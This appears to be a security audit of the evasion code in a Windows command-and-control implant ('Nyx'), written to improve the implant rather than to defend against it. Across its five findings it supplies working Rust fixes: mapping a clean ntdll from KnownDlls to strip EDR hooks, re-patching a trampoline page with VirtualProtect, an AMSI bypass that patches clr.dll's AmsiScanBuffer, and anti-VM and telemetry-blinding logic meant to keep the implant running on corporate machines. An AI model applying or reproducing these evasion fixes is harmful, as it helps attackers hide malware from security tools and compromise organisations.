# Nyx Implant Evasion Subsystem Security Audit Report

This document details the security vulnerabilities, logic bugs, architectural gaps, and detection risk identified during the audit of the following files under `crates/implant-win/src/`:
- `unhook.rs`
- `blind.rs`
- `blind_hwbp.rs`
- `antidebug.rs`
- `hookchain.rs`
- `envprobe.rs`
- `evasion_glue.rs`

---

## Executive Summary
The audit of the Nyx implant's evasion subsystem revealed five significant issues ranging from logic errors that completely disable stealth paths to potential memory access violation crashes and false-positive environment detection bugs. Correcting these issues is vital to ensuring the implant's stealth, stability, and operational reliability on physical enterprise targets.

### Findings Matrix

| Ref | Finding Name | Severity | Impact | Affected File |
| :--- | :--- | :--- | :--- | :--- |
| **NYX-EV-01** | KnownDlls Path Corrupted (Broken KnownDlls Mapping) | **High** | EDR Evasion bypass failure (Forces loud on-disk DLL read) | `unhook.rs` |
| **NYX-EV-02** | HookChain Re-Instrumentation Memory Access Violation | **High** | Denials of service / Implant crash on re-patch | `hookchain.rs` |
| **NYX-EV-03** | CLR AMSI Blinding returning `S_OK` with uninitialized output | **High** | Random assembly load blocks / Undetected instability | `blind.rs` |
| **NYX-EV-04** | VBS/HVCI False-Positive VM Detection on Corporate Workstations | **Medium** | Premature exit / dormant failure on physical Win11 | `envprobe.rs` |
| **NYX-EV-05** | Thread-Local Scope Limitation of HWBP Blinding | **Medium** | Telemetry leakage from background / worker threads | `blind_hwbp.rs` |

---

## Detailed Findings

### NYX-EV-01: KnownDlls Path Corrupted (Broken KnownDlls Mapping)
* **Severity:** **High**
* **Affected Code:** `crates/implant-win/src/unhook.rs` (Lines 221-246)
* **Description:** 
  To map a pristine copy of `ntdll.dll` from memory to extract system call numbers (SSNs) without EDR hook modifications, the code attempts to map the `\KnownDlls\ntdll` section. However, the path string built on the stack is defined as:
  ```rust
  let mut path: [u16; 15] = [
      b'\\' as u16, b'K' as u16, b'n' as u16, b'o' as u16, b'w' as u16, b'n' as u16,
      b'D' as u16, b'l' as u16, b'l' as u16, b's' as u16, b'\\' as u16, b'n' as u16,
      b't' as u16, b'd' as u16, b'l' as u16,
  ];
  ```
  This array contains 15 elements and spells `\KnownDlls\ntdl` (missing the final `'l'`). Additionally, the `UnicodeStringMut` struct length fields are configured as:
  ```rust
  let mut name = UnicodeStringMut {
      length: (14 * 2) as u16,         // 14 characters = "\KnownDlls\ntd"
      maximum_length: (15 * 2) as u16, // 15 characters
      buffer: path.as_mut_ptr(),
  };
  ```
  Setting the length to 14 causes the kernel to attempt to open `\KnownDlls\ntd`. Even if the length was corrected to 15, it would open `\KnownDlls\ntdl`. Neither path exists.
* **Threat Scenario:** 
  The call to `NtOpenSection` always returns `STATUS_OBJECT_NAME_NOT_FOUND` (or similar). Consequently, the implant fails to resolve pristine bytes from `KnownDlls` and *always* falls back to the disk path (`fresh_ntdll_text_disk()`). Reading `%SystemRoot%\System32\ntdll.dll` off disk from a non-system-loader process is a highly suspicious indicator that triggers EDR file-read alerts.
* **Exact Fix:** 
  Correct the path array length to 16 characters (or 17 with NUL), spell out `ntdll` correctly, and set the length fields to match:
  ```rust
  // 16 chars + NUL = 17 wide
  let mut path: [u16; 17] = [
      b'\\' as u16, b'K' as u16, b'n' as u16, b'o' as u16, b'w' as u16, b'n' as u16,
      b'D' as u16, b'l' as u16, b'l' as u16, b's' as u16, b'\\' as u16, b'n' as u16,
      b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0,
  ];
  let mut name = UnicodeStringMut {
      length: (16 * 2) as u16,         // 16 characters, no NUL counted
      maximum_length: (17 * 2) as u16, // room for NUL
      buffer: path.as_mut_ptr(),
  };
  ```

---

### NYX-EV-02: HookChain Re-Instrumentation Memory Access Violation
* **Severity:** **High**
* **Affected Code:** `crates/implant-win/src/hookchain.rs` (Lines 325-380)
* **Description:** 
  To reroute indirect imports of subsystem DLLs, HookChain allocates a persistent trampoline page (`STUB_PAGE`). The allocation is initially made using `PAGE_EXECUTE_READWRITE` (RWX), and stub bytes are written. Once all redirection is done, `apply()` calls `lockdown_stub_page()`, which changes the protection to `PAGE_EXECUTE_READ` (RX) to remove permanently RWX memory indicators.
  
  If EDR restores its hooks, the beacon's loop attempts to re-run `apply()` to patch them again. During the second cycle, `alloc_persistent_stub` loads the existing `STUB_PAGE` address but performs no memory protection state transitions. It directly attempts to copy bytes onto the page using `copy_nonoverlapping`:
  ```rust
  unsafe {
      core::ptr::copy_nonoverlapping(bytes.as_ptr(), stub_addr as *mut u8, bytes.len());
  }
  ```
  Since the page was locked down to RX, writing to it generates an immediate access violation.
* **Threat Scenario:** 
  When the beacon attempts to re-apply the evasion bypass after EDR hook recovery, it encounters a write access violation and crashes, terminating the implant's execution.
* **Exact Fix:** 
  In `alloc_persistent_stub()`, if the page is already allocated, change its protection back to RWX (or RW) before copying the new stub, then revert to RX. Alternatively, track if the page is currently locked down and transition protection accordingly:
  ```rust
  // Inside alloc_persistent_stub()
  // Before copying bytes:
  let mut old_protect: u32 = 0;
  type FnVP = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
  if let Some(vp_addr) = resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
      let vp: FnVP = core::mem::transmute(vp_addr);
      vp(stub_addr as *mut c_void, STUB_SIZE, 0x40 /* RWX */, &mut old_protect);
  }
  
  core::ptr::copy_nonoverlapping(bytes.as_ptr(), stub_addr as *mut u8, bytes.len());
  
  if let Some(vp_addr) = resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
      let vp: FnVP = core::mem::transmute(vp_addr);
      let mut dummy: u32 = 0;
      vp(stub_addr as *mut c_void, STUB_SIZE, old_protect, &mut dummy);
  }
  ```

---

### NYX-EV-03: CLR AMSI Blinding returning `S_OK` with uninitialized output
* **Severity:** **High**
* **Affected Code:** `crates/implant-win/src/blind.rs` (Lines 153-162) and `crates/implant-win/src/evasion_glue.rs` (Lines 230-239)
* **Description:** 
  The `BlindTarget::Clr` arm of the blinding process resolves `clr.dll!AmsiScanBuffer` and calls `patch_at(addr)`. `patch_at` applies the `ETW_PATCH` bytes (`xor rax, rax; ret`), which causes the function to return `S_OK` (0).
  
  The prototype of `AmsiScanBuffer` requires a pointer to `AMSI_RESULT` as its 6th parameter:
  ```cpp
  HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result
  );
  ```
  If `AmsiScanBuffer` returns `S_OK`, the caller assumes the scan was completed and inspects `*result`. Because the function prologue is replaced with an immediate return, `*result` is never written to. The caller reads whatever uninitialized stack garbage happens to reside in that address. If this garbage is non-zero (specifically `>= AMSI_RESULT_DETECTED` (0x8000)), the host treats it as malware.
* **Threat Scenario:** 
  When the CLR loads assemblies in-memory, it invokes `clr.dll!AmsiScanBuffer`. The patched function returns `S_OK` but leaves the result pointer uninitialized. Based on random stack layout patterns, the CLR intermittently flags clean memory buffers as malicious and blocks execution, or causes application instability.
* **Exact Fix:** 
  To fail-open AMSI cleanly, the function should return a failure HRESULT like `E_INVALIDARG` (`0x80070057`). When the function returns a failure, the caller skips checking the `result` out-pointer and defaults to allowing the scan to pass (fails-open). Change `BlindTarget::Clr` to use the `AMSI_PATCH` (`mov eax, 0x80070057; ret`):
  ```rust
  // In evasion_glue.rs
  BlindTarget::Clr => {
      match crate::resolve::export_addr(b"clr.dll", b"AmsiScanBuffer") {
          Some(addr) => crate::blind::write_patch(addr, &crate::blind::AMSI_PATCH),
          None => return Err(EvasionError::Unresolved("clr.dll!AmsiScanBuffer")),
      }
  }
  ```

---

### NYX-EV-04: VBS/HVCI False-Positive VM Detection on Corporate Workstations
* **Severity:** **Medium**
* **Affected Code:** `crates/implant-win/src/envprobe.rs` (Lines 569-571)
* **Description:** 
  The timing heuristic `rdtsc_cpuid_is_virtualized()` measures the cycle overhead of the `CPUID` instruction to detect VM-exit emulation. On physical Windows 11 machines with Virtualization-Based Security (VBS) and Hypervisor-Protected Code Integrity (HVCI) enabled, the physical hypervisor traps CPUID instructions, adding significant VM-exit timing overhead even on bare metal.
  
  Although comments label this timing check as a "corroborator," `looks_like_analysis_env` treats it as a primary trigger if other checks are clean:
  ```rust
  if rdtsc_cpuid_is_virtualized() {
      return EnvVerdict::AnalysisEnv;
  }
  ```
* **Threat Scenario:** 
  A standard, physical corporate laptop running Windows 11 with default VBS/HVCI will fail the timing check. The implant will flag it as an `AnalysisEnv` and bail, rendering the implant unusable on legitimate enterprise targets.
* **Exact Fix:** 
  Do not trigger a VM verdict based on RDTSC CPUID timing alone unless it is paired with another indicator (e.g. a hypervisor presence CPUID bit set, but a suspicious or missing brand string). If the brand string is `Microsoft Hv` and the VM OUI checks are clean, it is highly likely to be a standard VBS/HVCI physical workstation, and timing checks should be bypassed:
  ```rust
  // Modify looks_like_analysis_env() to require corroboration:
  // Only trigger on timing if we have some other minor VM indicator, or
  // skip timing-based verdicts on VBS systems.
  ```

---

### NYX-EV-05: Thread-Local Scope Limitation of HWBP Blinding
* **Severity:** **Medium**
* **Affected Code:** `crates/implant-win/src/blind_hwbp.rs` (Line 404 onwards)
* **Description:** 
  Hardware breakpoints (DR0-DR3) are thread-specific CPU registers. The `add_hwbp` function configures these registers on the current thread using `NtSetContextThread(NT_CURRENT_THREAD, ...)`.
  
  If the C2 implant executes jobs or runs inline code that creates background helper threads, or if the host process executes internal telemetry logging on background threads, these threads will not have `DR0-DR3` populated.
* **Threat Scenario:** 
  Telemetry event writes (e.g. `EtwEventWrite` or assembly load scans) occurring on other threads bypass the HWBP redirect entirely, and telemetry is sent to the EDR.
* **Exact Fix:** 
  Document this limitation. Suggest HookChain as the preferred process-wide evasion mechanism when operating in multithreaded host processes (such as injected explorer.exe or svchost.exe), since HookChain modifies the Import Address Table of the subsystem DLLs, which is shared globally across all threads in the process.

---

### Verification and Audit Methodology
The findings in this report were verified using manual static analysis of assembly offsets, structural padding logic, Win32 API contracts, and runtime execution sequences. The KnownDlls spelling error and HookChain re-protection write violation were verified against the exact logic implementations in the respective Rust source files.
